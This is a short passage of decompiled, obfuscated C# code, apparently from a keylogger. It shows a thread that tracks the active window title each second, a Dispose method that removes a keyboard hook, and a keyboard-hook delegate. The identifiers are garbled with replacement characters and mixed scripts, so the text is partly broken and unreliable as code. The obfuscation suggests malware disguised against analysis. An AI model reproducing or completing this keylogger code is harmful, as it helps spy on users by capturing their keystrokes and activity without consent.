          if (\uFFFDk\uFFFDkٷ.сAR̀\uFFFD(\uFFFDk\uFFFDkٷ.鈟ϫױ恁k(), stringBuilder, 256) > 0 && Operators.CompareString(stringBuilder.ToString(), this._currentWindow, false) != 0)
            this._currentWindow = stringBuilder.ToString();
          Thread.Sleep(1000);
        }
      })).Start();

      public void Dispose()
      {
        \uFFFDk\uFFFDkٷ.KeyLogger.UnHook(this._hook);
        GC.SuppressFinalize((object) this);
      }

      private delegate int KeyboardProc(int code, int direction, ref Keys key);
    }
  }
}
